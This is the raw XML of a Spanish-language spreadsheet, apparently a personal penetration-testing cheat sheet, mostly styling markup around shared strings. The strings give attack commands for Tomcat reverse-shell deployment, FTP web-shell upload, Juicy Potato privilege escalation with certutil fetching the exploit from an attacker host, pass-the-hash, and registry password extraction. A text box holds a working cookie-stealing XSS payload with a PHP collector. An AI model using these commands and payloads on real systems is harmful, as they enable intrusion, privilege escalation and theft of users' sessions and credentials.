  <si>
    <t xml:space="preserve">Para instalar modulos que sean requeridos para ejecutar un exploit </t>
  </si>
  <si>
    <t xml:space="preserve">python tomcatWarDeployer.py -U user -P password -H 10.10.10.10 -p 9999 IP_TomCat </t>
  </si>
  <si>
    <t>Descargar de su Github</t>
  </si>
  <si>
    <t>Para desplegar una shell reversa de forma automatica en TomCat</t>
  </si>
  <si>
    <t>ike-scan -M 10.10.10.10</t>
  </si>
  <si>
    <t xml:space="preserve">Nos devuelve toda la informacion necesaria para configurar nuestra VPN </t>
  </si>
  <si>
    <t>La M es de multilinea</t>
  </si>
  <si>
    <t>apt-get install strongswan</t>
  </si>
  <si>
    <t>Cliente VPN IpSec</t>
  </si>
  <si>
    <t>put shell.aspx</t>
  </si>
  <si>
    <t>Para cargar una Shell a traves de FTP</t>
  </si>
  <si>
    <t>Luego queda adivinar donde se subio con un dirsearch</t>
  </si>
  <si>
    <t>Nos muestra los privilegios que tenemos</t>
  </si>
  <si>
    <t>JUICY POTATO</t>
  </si>
  <si>
    <t>Se necesita SeImpersonatePrivilege Enabled</t>
  </si>
  <si>
    <t>JuicyPotato.exe</t>
  </si>
  <si>
    <t>Si tenenemos un usuario de servicio RED podemos usar Juicy Potato</t>
  </si>
  <si>
    <t>http://ohpe.it/juicy-potato/CLSID/</t>
  </si>
  <si>
    <t>Nos saca el CLSID que hay que usar en el exploit</t>
  </si>
  <si>
    <t>certutil.exe -urlcache -split -f http://10.10.10.10/juicypotato.exe juicypotato.exe</t>
  </si>
  <si>
    <t>Si tiene problemas probar con C:\Windows\Temp\juicypotato.exe</t>
  </si>
  <si>
    <t>Si no probar con el temp de Appdata del usuario con el que estemos conectados que ahi si tendremos permisos de escritura</t>
  </si>
  <si>
    <t>Otra forma</t>
  </si>
  <si>
    <t>certutil.exe -urlcache -split -f http://10.10.10.10/recurso.exe recurso.exe</t>
  </si>
  <si>
    <t>juicypotato.exe -p shell.bat -l 1337 -t* -c {CLSID}</t>
  </si>
  <si>
    <t>Como explotar Juicy Potato</t>
  </si>
  <si>
    <t>-p necesita la ruta con el fichero bat que contiene la conexion Netcat -l hay que especificar un puerto aleatorio* Es para que pruebe diferentes formas de crear un proceso a traves de winapi -c hace falta que este entre llaves {}</t>
  </si>
  <si>
    <t>explainshell.com</t>
  </si>
  <si>
    <t>Explicacion de comandos, le pasamos un comando y con Man nos explica lo que hace</t>
  </si>
  <si>
    <t>Muy bueno para ver que hace la sintaxis del comando</t>
  </si>
  <si>
    <t>Para maquinas Windows funciona muy bien</t>
  </si>
  <si>
    <t>nmap -n -vvv -Pn -p- --min-rate 5000 10.10.10.10</t>
  </si>
  <si>
    <t>winexe -U Administrator //127.0.0.1 "cmd.exe"</t>
  </si>
  <si>
    <t xml:space="preserve">Se necesita un Remote Port Forwarding y nos abre una shell administrador si tenemos las credenciales </t>
  </si>
  <si>
    <t>Nos permite ver editar permisos, es la lista de control de acceso</t>
  </si>
  <si>
    <t>icacls *</t>
  </si>
  <si>
    <t>Si tiene (OI) (CI) (F) quiere decir carpetas,archivos,carpetas dentro de otras carpetas full control</t>
  </si>
  <si>
    <t>cacls root.txt /E /P Usuario:F</t>
  </si>
  <si>
    <t>/E para editar ACL /P para editar permisos :F Fullcontrol</t>
  </si>
  <si>
    <t>Para cambiar permisos aun archivo si tenemos privilegios</t>
  </si>
  <si>
    <t>Si se cuenta con el inicio de sesion automatico</t>
  </si>
  <si>
    <t>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"</t>
  </si>
  <si>
    <t>La contraseña queda almacenada en la BD del registro</t>
  </si>
  <si>
    <t>Descargar el bat o el exe nos sugiere exploits a Usar para la escalada</t>
  </si>
  <si>
    <t>JENKINS</t>
  </si>
  <si>
    <t>Nos permite ejecutar scripts propios de Jenkins de manera remota que se ejecuta comandos del sistema</t>
  </si>
  <si>
    <t>Jenkins --&gt; Manage Jenkins--&gt; Script Console --&gt;</t>
  </si>
  <si>
    <t>pth-winexe -U administrador //10.10.10.10 cmd</t>
  </si>
  <si>
    <t>Hay que hacer un export SMBHASH=hash_NTLM   para que funciona de esta manera hay que exportar el hash a una variable de entorno</t>
  </si>
  <si>
    <t>Pass the Hash con winexe</t>
  </si>
  <si>
    <t>netsh firewall set service remoteadmin enable</t>
  </si>
  <si>
    <t>netsh firewall set service remoteadmin enable netsh firewall set service remotedesktop enable</t>
  </si>
  <si>
    <t>netsh firewall set service remotedesktop enable</t>
  </si>
  <si>
    <t>Para habilitar en el firewall las conexiones por escritorio remoto</t>
  </si>
  <si>
    <t>Para habilitar el escritorio remoto en el firewall</t>
  </si>
  <si>
    <t>apt-get install keepassx</t>
  </si>
  <si>
    <t>Para abrir BD de Keepass</t>
  </si>
  <si>
    <t>Necesitamos saber la contraseña</t>
  </si>
  <si>
    <t>ENUM4LINUX</t>
  </si>
  <si>
    <t>enum4linux -a 10.10.10.10</t>
  </si>
  <si>
    <t>-a es de All para que nos enumere todo</t>
  </si>
  <si>
    <t>Nos enumera una maquina Linux</t>
  </si>
  <si>
    <t>dir /r</t>
  </si>
  <si>
    <t>Para ver ADS Alternate Data Stream que son flujos de datos alternativos caracteristicas de ficheros NFS</t>
  </si>
  <si>
    <t>Es exclusivo de NTFS Se puede incluir metainformacion en un archivo</t>
  </si>
  <si>
    <t>ADS NFS</t>
  </si>
  <si>
    <t>more &lt;archivo.txt:root.txt&gt; root.txt</t>
  </si>
  <si>
    <t>Sacamos el archivo NFS oculto dentro del archivo.txt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</si>
</sst>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font>
      <sz val="11"/>
      <color theme="1"/>
      <name val="Calibri"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <sz val="11"/>
      <color rgb="FF006100"/>
      <name val="Calibri"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <b/>
      <sz val="8"/>
      <color indexed="9"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <b/>
      <i/>
      <sz val="14"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <b/>
      <sz val="14"/>
      <color indexed="9"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <sz val="8"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <b/>
      <sz val="8"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <i/>
      <sz val="8"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <b/>
      <i/>
      <sz val="8"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <sz val="10"/>
      <color indexed="8"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <sz val="11"/>
      <color rgb="FF000000"/>
      <name val="Calibri"/>
      <family val="2"/>
    </font>
    <font>
      <sz val="12"/>
      <color rgb="FF000000"/>
      <name val="Inconsolata"/>
      <family val="3"/>
    </font>
    <font>
      <sz val="12"/>
      <color rgb="FF666600"/>
      <name val="Inconsolata"/>
      <family val="3"/>
    </font>
    <font>
      <sz val="12"/>
      <color rgb="FF44494F"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <sz val="11"/>
      <color rgb="FFE83E8C"/>
      <name val="Consolas"/>
      <family val="3"/>
    </font>
    <font>
      <b/>
      <i/>
      <sz val="8"/>
      <color rgb="FF333333"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <sz val="12"/>
      <color rgb="FF1E1E1E"/>
      <name val="Segoe UI"/>
      <family val="2"/>
    </font>
    <font>
      <i/>
      <sz val="8"/>
      <color rgb="FF666666"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <sz val="11"/>
      <color rgb="FF202122"/>
      <name val="Courier New"/>
      <family val="3"/>
    </font>
  </fonts>
  <fills count="10">
    <fill>
      <patternFill patternType="none"/>
    </fill>
    <fill>
      <patternFill patternType="gray125"/>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor rgb="FFC6EFCE"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor indexed="63"/>
        <bgColor indexed="59"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor theme="0"/>
        <bgColor indexed="26"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor theme="0"/>
        <bgColor indexed="41"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor indexed="22"/>
        <bgColor indexed="41"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor indexed="9"/>
        <bgColor indexed="26"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor theme="0" tint="-4.9989318521683403E-2"/>
        <bgColor indexed="26"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor theme="0" tint="-0.14999847407452621"/>
        <bgColor indexed="26"/>
      </patternFill>
    </fill>
  </fills>
  <borders count="3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8"/>
      </right>
      <top style="medium">
        <color indexed="64"/>
      </top>
      <bottom/>
      <diagonal/>
    </border>
    <border>
      <left/>
      <right style="thin">
        <color indexed="8"/>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theme="0" tint="-0.14999847407452621"/>
      </right>
      <top style="thin">
        <color theme="0" tint="-0.14999847407452621"/>
      </top>
      <bottom style="thin">
        <color theme="0" tint="-0.14999847407452621"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left/>
      <right style="medium">
        <color indexed="64"/>
      </right>
      <top/>
      <bottom style="thin">
        <color theme="0" tint="-0.14999847407452621"/>
      </bottom>
      <diagonal/>
    </border>
    <border>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medium">
        <color indexed="64"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left style="medium">
        <color indexed="8"/>
      </left>
      <right style="thin">
        <color auto="1"/>
      </right>
      <top style="medium">
        <color indexed="64"/>
      </top>
      <bottom style="thin">
        <color indexed="64"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left style="thin">
        <color indexed="64"/>
      </left>
      <right style="thin">
        <color indexed="64"/>
      </right>
      <top/>
      <bottom style="thin">
        <color theme="0" tint="-0.14999847407452621"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left style="medium">
        <color indexed="64"/>
      </left>
      <right style="thin">
        <color theme="0" tint="-0.14999847407452621"/>
      </right>
      <top/>
      <bottom/>
      <diagonal/>
    </border>
    <border>
      <left style="thin">
        <color indexed="64"/>
      </left>
      <right style="thin">
        <color indexed="64"/>
      </right>
      <top/>
      <bottom/>
      <diagonal/>
    </border>
    <border>
      <left style="medium">
        <color indexed="64"/>
      </left>
      <right style="thin">
        <color indexed="64"/>
      </right>
      <top style="thin">
        <color theme="0" tint="-0.14999847407452621"/>
      </top>
      <bottom/>
      <diagonal/>
    </border>
    <border>
      <left style="medium">
        <color indexed="64"/>
      </left>
      <right style="thin">
        <color indexed="64"/>
      </right>
      <top/>
      <bottom/>
      <diagonal/>
    </border>
    <border>
      <left style="medium">
        <color indexed="64"/>
      </left>
      <right style="thin">
        <color indexed="64"/>
      </right>
      <top/>
      <bottom style="thin">
        <color theme="0" tint="-0.14999847407452621"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left style="thin">
        <color indexed="64"/>
      </left>
      <right style="thin">
        <color indexed="64"/>
      </right>
      <top style="thin">
        <color theme="0" tint="-0.14999847407452621"/>
      </top>
      <bottom/>
      <diagonal/>
    </border>
  </borders>
  <cellStyleXfs count="2">
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0"/>
    <xf numFmtId="0" fontId="1" fillId="2" borderId="0" applyNumberFormat="0" applyBorder="0" applyAlignment="0" applyProtection="0"/>
  </cellStyleXfs>
  <cellXfs count="79">
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0"/>
    <xf numFmtId="0" fontId="3" fillId="4" borderId="7" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="3" fillId="4" borderId="0" xfId="0" applyFont="1" applyFill="1" applyAlignment="1">
      <alignment vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="3" fillId="4" borderId="8" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="5" borderId="7" xfId="0" applyFill="1" applyBorder="1"/>
    <xf numFmtId="0" fontId="0" fillId="5" borderId="0" xfId="0" applyFill="1"/>
    <xf numFmtId="0" fontId="0" fillId="5" borderId="8" xfId="0" applyFill="1" applyBorder="1"/>
    <xf numFmtId="0" fontId="3" fillId="4" borderId="9" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="3" fillId="4" borderId="10" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="3" fillId="4" borderId="11" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="6" fillId="7" borderId="14" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="8" fillId="8" borderId="16" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="8" fillId="8" borderId="17" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="9" fillId="6" borderId="0" xfId="0" applyFont="1" applyFill="1" applyAlignment="1">
      <alignment horizontal="right"/>
    </xf>
    <xf numFmtId="0" fontId="2" fillId="3" borderId="12" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="7" fillId="8" borderId="15" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="5" fillId="7" borderId="13" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="7" fillId="9" borderId="15" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="8" fillId="9" borderId="17" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="7" fillId="8" borderId="20" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="7" fillId="9" borderId="21" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="7" fillId="8" borderId="21" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="7" fillId="9" borderId="18" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="7" fillId="9" borderId="22" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="8" fillId="9" borderId="19" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="49" fontId="7" fillId="8" borderId="15" xfId="0" applyNumberFormat="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="49" fontId="7" fillId="8" borderId="21" xfId="0" applyNumberFormat="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="49" fontId="8" fillId="8" borderId="17" xfId="0" applyNumberFormat="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="49" fontId="7" fillId="9" borderId="15" xfId="0" applyNumberFormat="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="49" fontId="7" fillId="9" borderId="21" xfId="0" applyNumberFormat="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="49" fontId="8" fillId="9" borderId="17" xfId="0" applyNumberFormat="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="7" fillId="8" borderId="24" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="5" fillId="7" borderId="23" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="49" fontId="7" fillId="8" borderId="18" xfId="0" applyNumberFormat="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="49" fontId="7" fillId="8" borderId="22" xfId="0" applyNumberFormat="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="49" fontId="8" fillId="8" borderId="19" xfId="0" applyNumberFormat="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="49" fontId="0" fillId="0" borderId="0" xfId="0" applyNumberFormat="1"/>
    <xf numFmtId="49" fontId="2" fillId="3" borderId="12" xfId="0" applyNumberFormat="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="49" fontId="5" fillId="7" borderId="23" xfId="0" applyNumberFormat="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="49" fontId="6" fillId="7" borderId="14" xfId="0" applyNumberFormat="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="49" fontId="7" fillId="8" borderId="25" xfId="0" applyNumberFormat="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="49" fontId="7" fillId="8" borderId="26" xfId="0" applyNumberFormat="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="14" fillId="0" borderId="0" xfId="0" applyFont="1"/>
    <xf numFmtId="49" fontId="5" fillId="7" borderId="13" xfId="0" applyNumberFormat="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="49" fontId="7" fillId="9" borderId="25" xfId="0" applyNumberFormat="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="7" fillId="9" borderId="25" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="7" fillId="9" borderId="26"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7" fillId="8" borderId="25" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="7" fillId="8" borderId="26" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="49" fontId="8" fillId="8" borderId="8"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8" fillId="9" borderId="8" xfId="0" applyNumberFormat="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="16" fillId="0" borderId="0" xfId="0" applyFont="1"/>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5" fillId="8" borderId="15" xfId="0" applyNumberFormat="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="49" fontId="5" fillId="9" borderId="15"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8" borderId="2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8" fillId="9" borderId="8"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4" fillId="3" borderId="1"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3" borderId="3" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="4" fillId="3" borderId="4" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="4" fillId="3" borderId="5" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="4" fillId="3" borderId="6" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="49" fontId="1" fillId="2" borderId="10" xfId="1" applyNumberFormat="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="1" fillId="2" borderId="10" xfId="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="49" fontId="7" fillId="9" borderId="27" xfId="0" applyNumberFormat="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="49" fontId="7" fillId="9" borderId="28" xfId="0" applyNumberFormat="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="49" fontId="7" fillId="9" borderId="29" xfId="0" applyNumberFormat="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="49" fontId="7" fillId="9" borderId="3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4" xfId="0" applyNumberFormat="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
      <protection locked="0"/>
    </xf>
  </cellXfs>
  <cellStyles count="2">
    <cellStyle name="Bueno" xfId="1" builtinId="26"/>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2</xdr:row>
          <xdr:rowOff>47625</xdr:rowOff>
        </xdr:from>
        <xdr:to>
          <xdr:col>3</xdr:col>
          <xdr:colOff>714375</xdr:colOff>
          <xdr:row>4</xdr:row>
          <xdr:rowOff>38100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9525</xdr:colOff>
      <xdr:row>28</xdr:row>
      <xdr:rowOff>9525</xdr:rowOff>
    </xdr:from>
    <xdr:to>
      <xdr:col>3</xdr:col>
      <xdr:colOff>1038225</xdr:colOff>
      <xdr:row>43</xdr:row>
      <xdr:rowOff>152400</xdr:rowOff>
    </xdr:to>
    <xdr:sp macro="" textlink="">
      <xdr:nvSpPr>
        <xdr:cNvPr id="2" name="CuadroTexto 1"/>
        <xdr:cNvSpPr txBox="1"/>
      </xdr:nvSpPr>
      <xdr:spPr>
        <a:xfrm>
          <a:off x="9525" y="7239000"/>
          <a:ext cx="3143250" cy="3714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levantamos un servidor para recibir las cookies de la victima</a:t>
          </a:r>
        </a:p>
        <a:p>
          <a:endParaRPr lang="es-ES" sz="1100"/>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service apache2 start</a:t>
          </a:r>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cd</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="es-ES" sz="1100" baseline="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="+mn-ea"/>
              <a:cs typeface="+mn-cs"/>
            </a:rPr>
            <a:t> /var/www/html/</a:t>
          </a:r>
          <a:endParaRPr lang="es-ES" sz="1100"/>
        </a:p>
        <a:p>
          <a:r>
            <a:rPr lang="es-ES" sz="1100"/>
            <a:t>nano cookies.php</a:t>
          </a:r>
        </a:p>
        <a:p>
          <a:endParaRPr lang="es-ES" sz="1100"/>
        </a:p>
        <a:p>
          <a:r>
            <a:rPr lang="es-ES" sz="1100"/>
            <a:t>&lt;?php</a:t>
          </a:r>
        </a:p>
        <a:p>
          <a:r>
            <a:rPr lang="es-ES" sz="1100" baseline="0"/>
            <a:t>               </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="es-ES" sz="1100"/>
            <a:t>$handle=fopen("cookies_list.txt","a");</a:t>
          </a:r>
        </a:p>
        <a:p>
          <a:r>
            <a:rPr lang="es-ES" sz="1100" baseline="0"/>
            <a:t>               </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="es-ES" sz="1100"/>
            <a:t>fputs($handle,"\n".$_GET["cookie"]."\n");</a:t>
          </a:r>
        </a:p>
        <a:p>
          <a:r>
            <a:rPr lang="es-ES" sz="1100" baseline="0"/>
            <a:t>               </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="es-ES" sz="1100"/>
            <a:t>fclose($handle);</a:t>
          </a:r>
        </a:p>
        <a:p>
          <a:r>
            <a:rPr lang="es-ES" sz="1100"/>
            <a:t>?&gt;</a:t>
          </a:r>
        </a:p>
        <a:p>
          <a:endParaRPr lang="es-ES" sz="1100"/>
        </a:p>
        <a:p>
          <a:r>
            <a:rPr lang="es-ES" sz="1100"/>
            <a:t>touch cookies_list.txt</a:t>
          </a:r>
        </a:p>
        <a:p>
          <a:r>
            <a:rPr lang="es-ES" sz="1100"/>
            <a:t>chmod 777</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="es-ES" sz="1100" baseline="0"/>
            <a:t> cookies.php</a:t>
          </a:r>
        </a:p>
        <a:p>
          <a:r>
            <a:rPr lang="es-ES" sz="1100"/>
            <a:t>chmod 777 cookies_list.txt</a:t>
          </a:r>
        </a:p>
        <a:p>
          <a:endParaRPr lang="es-ES" sz="1100"/>
        </a:p>
        <a:p>
          <a:r>
            <a:rPr lang="es-ES" sz="1100"/>
            <a:t>&lt;script&gt;var i=new Image();i.src="IPnuestroservidor/cookies.php?cookie="+document.cookie;&lt;/script&gt;</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s://cs.piosky.fr/exploit/unix/reverse_shell/" TargetMode="External"/><Relationship Id="rId13" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://any.run/" TargetMode="External"/><Relationship Id="rId18" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://book.hacktricks.xyz/pentesting-web/file-inclusion" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.routerpasswords.com/" TargetMode="External"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/KAIT07/OSCP-PREPARATION-THM" TargetMode="External"/><Relationship Id="rId12" 